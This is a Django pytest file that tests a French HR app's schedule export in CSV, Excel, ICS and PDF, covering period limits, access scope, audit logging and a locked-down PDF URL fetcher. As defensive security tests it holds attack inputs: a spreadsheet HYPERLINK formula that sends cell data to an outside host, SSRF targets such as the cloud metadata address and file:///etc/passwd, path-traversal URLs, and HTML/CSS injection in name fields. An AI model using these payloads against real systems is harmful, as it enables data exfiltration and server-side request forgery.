"""Export du planning : formats, contrôles, périmètre, journal, sécurité du PDF."""

import csv
import io
import socket
from datetime import timedelta

import pytest
from openpyxl import load_workbook

from apps.approvals.tests.conftest import next_weekday
from apps.core import pdf
from apps.core.models import AuditLog, Company
from apps.core.tenancy import tenant_context
from apps.people.models import Employee
from tests.factories import EmployeeFactory, ServiceFactory

pytestmark = pytest.mark.django_db
HYPERLINK = '=HYPERLINK("https://exemple.test/?d="&A1;"clic")'


def custom(start, end, fmt="csv", **extra):
    params = {"periode": "personnalisee", "debut": start.isoformat(), "fin": end.isoformat()}
    params.update(format=fmt, **extra)
    return "&".join(f"{k}={v}" for k, v in params.items())


def download(client, query):
    response = client.get(f"/planning/export/fichier/?{query}")
    assert response.status_code == 200, response.content[:500]
    return response


@pytest.fixture
def week():
    monday = next_weekday()
    return monday, monday + timedelta(days=6)


def test_four_months_are_refused(client_for, company_a):
    monday = next_weekday()
    response = client_for(company_a.hr).get(
        f"/planning/export/?{custom(monday, monday + timedelta(days=120))}"
    )
    assert response.status_code == 422
    assert "La période est limitée à 3 mois par export." in response.content.decode()
    assert (
        client_for(company_a.hr)
        .get(f"/planning/export/fichier/?{custom(monday, monday + timedelta(days=120))}")
        .status_code
        == 400
    )


def test_end_before_start_is_refused(client_for, company_a):
    monday = next_weekday()
    response = client_for(company_a.hr).get(
        f"/planning/export/?{custom(monday, monday - timedelta(days=1))}"
    )
    assert "La fin doit être après le début." in response.content.decode()


def test_preview_shows_six_rows_and_five_days(client_for, company_a, week):
    with tenant_context(company_a.company):
        for _n in range(8):
            EmployeeFactory(company=company_a.company, service=company_a.service, user=None)
    content = client_for(company_a.hr).get(f"/planning/export/?{custom(*week)}").content.decode()
    assert "Aperçu de l&#x27;export" in content or "Aperçu de l'export" in content
    preview = content[content.index("<tbody>") : content.index("</tbody>")]
    assert preview.count("<tr>") == 6
    assert preview.count('<td><span class="cell wk') == 6 * 5
    assert "Télécharger le fichier CSV" in content


def test_csv_opens_in_excel(client_for, company_a, week):
    response = download(client_for(company_a.hr), custom(*week))
    assert response["Content-Type"].startswith("text/csv")
    assert 'filename="planning-' in response["Content-Disposition"]
    raw = response.content
    assert raw.startswith("﻿".encode())  # BOM : accents corrects dans Excel
    rows = list(csv.reader(io.StringIO(raw.decode("utf-8-sig")), delimiter=";"))
    assert rows[0][:3] == ["Collaborateur", "Service", "Site"]
    assert len(rows[0]) == 3 + 5  # jours ouvrés seulement
    camille = next(r for r in rows if r[0] == company_a.employee.full_name)
    assert camille[3] == "Télétravail (en attente)"  # fixture : lundi
    assert camille[4] == "Sur site"


def test_excel_keeps_formulas_as_text_and_uses_the_legend_colors(client_for, company_a, week):
    Employee.all_companies.filter(pk=company_a.manager.pk).update(first_name=HYPERLINK)
    response = download(client_for(company_a.hr), custom(*week, fmt="xlsx"))
    sheet = load_workbook(io.BytesIO(response.content)).active
    assert sheet.freeze_panes == "D2"
    names = {sheet.cell(row=r, column=1).value: r for r in range(2, sheet.max_row + 1)}
    cell = next(sheet.cell(row=r, column=1) for name, r in names.items() if "HYPERLINK" in name)
    assert cell.data_type == "s" and cell.value.startswith("'") and "=HYPERLINK" in cell.value
    for row in sheet.iter_rows():
        for item in row:
            assert item.data_type != "f"  # aucune formule dans le fichier
    camille = names[company_a.employee.full_name]
    assert sheet.cell(row=camille, column=4).fill.fgColor.rgb.endswith("C7E9E7")  # tel-bg


def test_ics_has_one_event_per_absence_and_telework(client_for, company_a, week):
    Employee.all_companies.filter(pk=company_a.employee.pk).update(first_name="Camille, Anne")
    response = download(client_for(company_a.hr), custom(*week, fmt="ics"))
    assert response["Content-Type"].startswith("text/calendar")
    text = response.content.decode()
    assert text.startswith("BEGIN:VCALENDAR\r\n") and text.endswith("END:VCALENDAR\r\n")
    assert text.count("BEGIN:VEVENT") == 1  # le télétravail de la fixture (l'astreinte non)
    assert "SUMMARY:Télétravail · Camille\\, Anne" in text
    assert "STATUS:TENTATIVE" in text
    assert f"DTSTART;VALUE=DATE:{week[0]:%Y%m%d}" in text
    assert all(len(line.encode()) <= 75 for line in text.split("\r\n"))


def test_pdf_is_a4_landscape_with_one_page_per_week(client_for, company_a):
    from apps.planning import exports, services

    monday = next_weekday()
    response = download(
        client_for(company_a.hr), custom(monday, monday + timedelta(days=13), fmt="pdf")
    )
    assert response["Content-Type"] == "application/pdf"
    assert response.content.startswith(b"%PDF")
    company = Company.objects.get(pk=company_a.company.pk)
    with tenant_context(company):
        hr = Employee.objects.get(pk=company_a.hr.pk)
        _h, _l, rows, _w = services.export_rows(hr, monday, monday + timedelta(days=13))
        context = exports.pdf_context(rows, monday, monday + timedelta(days=13), company)
        document = pdf.render_document("planning/pdf.html", context, company=company)
    assert len(document.pages) == 2  # une page par semaine
    page = document.pages[0]
    assert page.width > page.height  # paysage
    assert round(page.width * 25.4 / 96) == 297  # A4 : 297 mm


def test_export_scope_is_checked_server_side(client_for, company_a, week):
    with tenant_context(company_a.company):
        finance = ServiceFactory(company=company_a.company, name="Finance")
        outsider = EmployeeFactory(company=company_a.company, service=finance, last_name="Dehors")
    employee = client_for(company_a.employee)
    forged = employee.get(f"/planning/export/fichier/?{custom(*week, perimetre=finance.pk)}")
    assert forged.status_code == 400  # un autre service n'est pas un choix possible
    content = download(employee, custom(*week)).content.decode("utf-8-sig")
    assert outsider.full_name not in content and company_a.manager.full_name in content
    hr = download(client_for(company_a.hr), custom(*week, perimetre=finance.pk))
    hr_content = hr.content.decode("utf-8-sig")
    assert outsider.full_name in hr_content and company_a.manager.full_name not in hr_content


def test_export_is_logged_with_period_and_format_but_no_names(client_for, company_a, week):
    download(client_for(company_a.hr), custom(*week, fmt="xlsx"))
    log = AuditLog.all_companies.get(company=company_a.company, action="planning.exported")
    assert "Excel" in log.summary and "toute l'entreprise" in log.summary
    assert f"{week[0].day}" in log.summary
    for person in (company_a.employee, company_a.manager):
        assert person.last_name not in log.summary
    assert log.actor_id == company_a.hr.pk


def test_export_requires_the_module(client_for, company_a):
    from apps.core.models import CompanyModule, Module

    CompanyModule.all_companies.filter(company=company_a.company, module=Module.PLANNING).update(
        enabled=False
    )
    assert client_for(company_a.hr).get("/planning/export/").status_code == 403


# ---------- PDF : récupérateur d'URL fermé (L4-06) ----------


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "http://example.test/x.png",
        "https://example.test/a.css",
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:5432/",
        "data:image/png;base64,iVBORw0KGgo=",
        "https://dianna.invalid/static/../config/settings/base.py",
        "https://dianna.invalid/static/js/ui.js",
        "https://dianna.invalid/static/css/../../manage.py",
        "https://dianna.invalid/logo",  # pas de logo
    ],
)
def test_pdf_fetcher_refuses_everything_else(url, company_a):
    fetcher = pdf.DiannaURLFetcher(Company.objects.get(pk=company_a.company.pk))
    with pytest.raises(pdf.URLRefusedError):
        fetcher.fetch(url)


def test_pdf_fetcher_serves_dianna_fonts_and_styles():
    fetcher = pdf.DiannaURLFetcher()
    assert fetcher.fetch(pdf.STATIC_URL + "css/pdf.css").headers["Content-Type"] == "text/css"
    assert fetcher.fetch(pdf.STATIC_URL + "fonts/IBMPlexSans-Variable.woff2")


@pytest.fixture
def no_network(monkeypatch):
    """Toute connexion réseau fait échouer le test."""
    calls = []

    def refuse(*args, **kwargs):
        calls.append(args)
        raise AssertionError("connexion réseau interdite")

    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket.socket, "connect", refuse)
    return calls


def test_html_or_css_in_a_label_triggers_no_request(client_for, company_a, monkeypatch, no_network):
    Employee.all_companies.filter(pk=company_a.employee.pk).update(
        last_name='<img src="http://example.test/x.png">'
    )
    company_a.service.__class__.all_companies.filter(pk=company_a.service.pk).update(
        name="Support<style>@import url(http://example.test/b);</style>"
    )
    requested = []
    real = pdf.DiannaURLFetcher.fetch

    def spy(self, url, headers=None):
        requested.append(url)
        return real(self, url, headers)

    monkeypatch.setattr(pdf.DiannaURLFetcher, "fetch", spy)
    monday = next_weekday()
    response = download(
        client_for(company_a.hr), custom(monday, monday + timedelta(days=4), fmt="pdf")
    )
    assert response.content.startswith(b"%PDF")
    assert no_network == []
    assert all(url.startswith(pdf.STATIC_URL) for url in requested), requested


def test_even_raw_html_cannot_reach_the_network(no_network, settings, tmp_path):
    """Si une balise passait malgré l'échappement, le récupérateur la refuserait."""
    template_dir = tmp_path / "templates"
    template_dir.mkdir()
    (template_dir / "raw.html").write_text(
        '<html><body><img src="http://example.test/x.png">'
        '<div style="background:url(file:///etc/passwd)">x</div>'
        '<link rel="stylesheet" href="http://169.254.169.254/a.css"></body></html>'
    )
    settings.TEMPLATES = [
        {**settings.TEMPLATES[0], "DIRS": [template_dir, *settings.TEMPLATES[0]["DIRS"]]}
    ]
    fetcher = pdf.DiannaURLFetcher()
    content = pdf.render_pdf("raw.html", {}, fetcher=fetcher)
    assert content.startswith(b"%PDF")
    assert no_network == []
    assert set(fetcher.requested) == {
        "http://example.test/x.png",
        "file:///etc/passwd",
        "http://169.254.169.254/a.css",
    }  # demandées au récupérateur, toutes refusées sans requête
